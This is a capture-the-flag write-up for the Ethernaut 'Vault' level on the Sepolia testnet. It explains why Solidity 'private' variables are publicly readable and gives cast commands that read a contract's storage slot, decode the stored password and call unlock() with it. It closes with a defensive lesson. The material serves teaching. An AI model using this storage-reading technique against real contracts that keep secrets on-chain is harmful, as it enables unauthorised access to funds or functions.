# Ethernaut Challenge 08 — Vault

Unlock the vault to pass the level.

Instance address:

```
0xe018a3454E7572ea50018f9F4813335987e231FA
````

---

## 🎯 Goal

The challenge is solved when the variable `locked` becomes `false`.

---

## 🧠 Thought process

The contract stores a password as a private variable:

```solidity
bool public locked;       // slot 0
bytes32 private password; // slot 1
````

Even though `password` is marked as `private`, it is still stored on-chain.

👉 In Solidity:

* `private` restricts access from other contracts
* but storage is still publicly readable

So the strategy is:

1. read storage slot `1`
2. extract the password
3. call `unlock()` with that value

---

## 🧪 Step 1 — Read storage

We know that `password` is stored in slot `1`.

```bash
cast storage 0xe018a3454E7572ea50018f9F4813335987e231FA 1 \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```
0x412076657279207374726f6e67207365637265742070617373776f7264203a29
```

---

## 🔍 Step 2 — Decode the password

Convert the value to UTF-8:

```bash
cast to-utf8 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
```

Result:

```
A very strong secret password :)
```

---

## 🚀 Step 3 — Unlock the vault

Call the `unlock` function with the retrieved password:

```bash
cast send 0xe018a3454E7572ea50018f9F4813335987e231FA \
    "unlock(bytes32)" 0x412076657279207374726f6e67207365637265742070617373776f7264203a29 \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

Transaction hash:

```
0x9218dcb1435de919c40aa0b9cc8730e84f9204731f5c34fe586a6f2a23f2133d
```

---

## ✅ Step 4 — Verify the result

Check the value of `locked`:

```bash
cast call 0xe018a3454E7572ea50018f9F4813335987e231FA \
    "locked()" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```
0x0000000000000000000000000000000000000000000000000000000000000000
```

This corresponds to:

```
false
```

The vault is now unlocked and the challenge is completed.

---

## 🛡️ Security takeaway

This challenge highlights a common misconception about visibility in Solidity.

Key lessons:

* `private` variables are not secret
* all contract storage is publicly accessible on-chain
* sensitive data must never be stored in plaintext on-chain
* secrets should be handled off-chain or via cryptographic schemes

👉 Never rely on Solidity visibility (`private`, `internal`) for security.

